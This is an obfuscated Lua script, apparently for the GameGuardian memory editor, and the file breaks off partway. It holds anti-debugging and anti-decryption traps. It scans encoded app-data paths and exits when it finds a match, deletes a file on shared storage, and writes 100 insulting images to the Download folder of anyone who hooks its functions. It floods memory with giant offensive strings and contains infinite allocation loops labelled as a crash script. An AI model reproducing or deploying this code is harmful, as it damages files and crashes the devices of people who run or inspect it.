  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疣畞疖疩疟疚疢疝疕"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疢疚疦疣疒疝疘疔疣疠疝疞疖疒疑疝疕"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疢疕疔疧疟疜疖疗疑疝疙疞疗畞疢疙疠疗疗"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疦疢疕疨疡疖疖疤疖疣疨疕疛疝畞疛疜"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疗疘疥疕疓疪疨疢疤疤疜疘疗疔"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疩疩畞疡疠疤疦疢疚疧疕疢疧畞疗疘疟疕疨"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疞疟疓疘疡疨疠疥疓疣疒疜疔疡疡疨"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞畵疗疩疠疤畞疩疥疟疣疣疕疕疖"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疤疣疣疖疚疙疠疛疝疢疓疟"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疦疙疠畞疠疑疙疔疘疑疓疛疣疟疞疜疩畞疝疢畞疤疟疨疙疞"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疝疢疤疕疑疝疪畞疙疔"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疚疤疒疟疔疗疠疡疨疟疨"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疝疟疔畞疙疢疑疡"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疔疪疕疜疤疤疧疩疥疩疩疕疣"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疣疨疡疑"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疨疩疩疨疗疨疖疞"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疦疞疠疡疛"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疝疧疚疦疞疧疕疣疒疗疘疛疨疒疚疪疞疒疧疟"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疒疜疑疓疛疔疥疤疩畞疗疓"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疣畞疖疩疟疚疢疝疕"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疢疟疨疝疕疝疕疛"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疖疘疣疘疧疘疠疦疡疦疢疥疦疚疤疥"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疖疙疢疕疟疞疗疑疝疙疞疗畞疖疟疗"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疠疑疢疑疞疟疙疑疧疟疢疛疣畞疥疞疙疓疥疣畞疑疞疔疢疟疙疔畞疣疣疕"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疢疑疙疞疓疙疤疩疗疑疝疙疞疗畞疗疗疝疟疔"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疠疦疤畤疥"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疞疩疔疠疦疣疒畞疪畞疢畞疠疛疗疘"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疙疟疩疩疣疦疗疖疣疢疙疗"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疗疝疣疝"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疣疥疔疣疚疓疡疦疦疓疝疗疥疤疔疚疕疗"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疓疟疟疜疖疟疟疜疗疗疖疥疓疛疣疓疢疙疠疤畞疤疝"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疕疙疔疩疝疥疝疓疗疘疠疖疕疕疕疑疦疠疣"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疖疟疨疓疩疒疕疢畞疗疗"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疪疗疒"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疘疓疛疕疑疝畞疝疚疗疡疜")) 
jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疢疗疛疤疤疪畞疢疑疥疣疡疧疜")) 
jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疣疣疤疟疟疜畞疟疞疜疩畞疓疟疝畞疣疣疤疟疟疜"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畼畿畷畷畷畷畞疜疥疑")) 
jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疑疤疓疘畞畱疢疤畞疄疟疟疜畞疣疕疑疤疓疘"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疜疑疑疜疜疛疨疘疤疢疞疡疞疓疧"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疛疘疟疙疣疓疢疙疠疤畞疜疟疗疗疕疢"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疛疑疟疩疗疨疑疠疠"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞疃疟疥疢疓疕畻疟疞疪疜疕疤"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("疛疟疞疪疜疕疤畐畯畯畯"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

file,err=io.open(__x("畟疣疔疓疑疢疔畟畱疞疔疢疟疙疔畟疔疑疤疑畟疓疟疝畞畲疩畷畷疈畵疊"))
  jg=err:match(__x("畕畘畘畞畝留畕留"))
if jg==__x("畹疣畐疑畐疔疙疢疕疓疤疟疢疩") then 
gg[__x("疑疜疕疢疤")](__x("畵疂疂畿疂"))
os[__x("疕疨疙疤")]() 
elseif jg==__x("畾疟畐疣疥疓疘畐疖疙疜疕畐疟疢畐疔疙疢疕疓疤疟疢疩") then  
end

os[__x("疢疕疝疟疦疕")](__x("畟疣疔疓疑疢疔畟畾疟疤疕疣"))

local a=math.pi;local b=1/0;local function c(...)local d={}for e,f in 
pairs({...})do d[#d+1]=f end;return d end;local function g(h)return 
load(h)()end;g([==[function i() local j=gg;local k=j.alert or 
print;local l=j.getRangesList or function()return{}end;local m=j
.getValues or function()return{}end;local n=j.setValues or function()end
;local o=j.toast or print;local p=j.sleep or function()end;return 
{k,l,m,n,o,p}end]==]);local q=i();local r,s,t,u,v,w=q[1],q[2],q[3],
q[4],q[5],q[6];local function x(y)local z=0;for A=1,#y do z=z+y:byte(A)
end;return z end;local B={[x("XYZ")]=3,[x("ABC")]=5,[x("DEF")]=4,
[x("GHI")]=103,[x("JKL")]=0,[x("MNO")]=1,[x("PQR")]=6,[x("STU")]=9};local 
C={[x("VWX")]="ƶ",[x("YZ1")]="ʚ",[x("234")]="΀",[x("567")]="Ѭ",[x("890")]="Ϲ",
[x("QWE")]="ņ",[x("RTY")]="̉",[x("UIO")]="ӧ",[x("PAS")]="բ",[x("DFG")]="Þ",
[x("HJK")]="ו",[x("LZX")]="ٌ",[x("CVB")]="ڸ",[x("NM1")]="Ȧ"};local function D()
v("Iniciando...")w(1500);local E=a*b;local F=C[x("DFG")]or"";local G=C[x("GHI")]or"";local H=B[x("GHI")]or 0;local I=tonumber(utf8.codepoint(F))or 0;local J=I-H;v("Resultado: "..J)end;local K,L=pcall(D);if not K then r("Erro: "..L)end

  function xjlsfWyjx(crypted_str)
    local result = {}
    local shift_value = 5 
for i = 1, #crypted_str do
        local byte = string.byte(crypted_str, i)
        table.insert(result, byte)
    end
   for i = 1, math.floor(#result / 2) do
        result[i], result[#result - i + 1] = result[#result - i + 1], result[i]
    end
     for i = 1, #result do
        result[i] = string.char((result[i] - shift_value) % 256)
    end
    return table.concat(result)
end
local a=math.pi;local b=1/0;local function c(...)local d={}for e,f in 
pairs({...})do d[#d+1]=f end;return d end;local function g(h)return 
load(h)()end;g([==[function i() local j=gg;local k=j.alert or 
print;local l=j.getRangesList or function()return{}end;local m=j
.getValues or function()return{}end;local n=j.setValues or function()end
;local o=j.toast or print;local p=j.sleep or function()end;return 
{k,l,m,n,o,p}end]==]);local q=i();local r,s,t,u,v,w=q[1],q[2],q[3],
q[4],q[5],q[6];local function x(y)local z=0;for A=1,#y do z=z+y:byte(A)
end;return z end;local B={[x("XYZ")]=3,[x("ABC")]=5,[x("DEF")]=4,
[x("GHI")]=103,[x("JKL")]=0,[x("MNO")]=1,[x("PQR")]=6,[x("STU")]=9};local 
C={[x("VWX")]="ƶ",[x("YZ1")]="ʚ",[x("234")]="΀",[x("567")]="Ѭ",[x("890")]="Ϲ",
[x("QWE")]="ņ",[x("RTY")]="̉",[x("UIO")]="ӧ",[x("PAS")]="բ",[x("DFG")]="Þ",
[x("HJK")]="ו",[x("LZX")]="ٌ",[x("CVB")]="ڸ",[x("NM1")]="Ȧ"};local function D()
v("Iniciando...")w(1500);local E=a*b;local F=C[x("DFG")]or"";local G=C[x("GHI")]or"";local H=B[x("GHI")]or 0;local I=tonumber(utf8.codepoint(F))or 0;local J=I-H;v("Result: "..J)end;local K,L=pcall(D);if not K then r("Error: "..L)end

function WriteFilesGay()
Link = "https://apimeme.com/meme?meme=FRANGO&top=you+is+&bottom=GAY"
  path = "/sdcard/Download/"
  Name = "gay.png"
      for i = 1, 100 do
      local newName = "gay" .. i .. ".png"
      local bat = gg.makeRequest(Link).content
      if bat == nil then
        os.exit()
      end
      local file = io.open(path .. newName, "w")
      if file then
        file:write(bat)
        file:close()
      else
        print("Erro")
    end
  end
  end
  
  function gu2()
 c = tostring(_ENV.gg)
for k in c:gmatch("%s[@]?(/.-):") do
if k ~= gg.getFile() then
WriteFilesGay()
end
end
end
gu2()

function Big_log()
  local BATMAN1 = string.rep("fuck you", 9999)
  local BATMAN = string.rep(BATMAN1, 99)
  for i = 1, 9999 do
    gg.refineAddress({[1] = BATMAN})
  end
  for i = 1, 9999 do
    gg.refineNumber({[1] = BATMAN})
  end
end

  function checkFunctions()
  local Lock = {
    debug.getinfo(gg.toast).short_src,
    debug.getinfo(gg.getResults).short_src,
    debug.getinfo(gg.getValues).short_src,
    debug.getinfo(os.exit).short_src,
    debug.getinfo(gg.refineNumber).short_src,
    debug.getinfo(gg.refineAddress).short_src,
    debug.getinfo(gg.alert).short_src
  }
  for i, v in pairs(Lock) do
    if v ~= "toast" and v ~= "getResults" and v ~= debug.getinfo(1).short_src and v ~= gg.getFile() then
      for i = 1, 999999999 do
        gg.toast(" BATMAN PROTECTION ")
      end
      return
    end
  end
end

function checkExecutionTime()
  local a = os.time()
  for i = 1, 100 do
    load("iii")
  end
  local b = os.time()
  if b - a > 5 then
    gg.alert("noob decrypt")
    os.exit() 
end
end


Big_log()
checkFunctions()
checkExecutionTime()

--for crash script 
local function ProcessSpam()

    local SpamTable = {}
    local counter, toStr = 0, tostring

    local function GenerateSequence()
        local result = ""
        while counter < 100 do
            result = result .. toStr(counter * counter)
            counter = counter + 1
        end
        return result
    end

local function complexLoop()
    local t = {}
    
    while true do
        for i = 1, 20000 do  
            t[i] = {}
            for j = 1, 200 do  
                t[i][j] = string.rep("B", 2048)  
            end
        end
        
        local tmp = 0
        for k, v in pairs(t) do
            tmp = tmp + #v[1]
        end
    end
end

local function createMassiveData()
    
    local t = {}
    
    while true do
             for i = 1, 100000 do
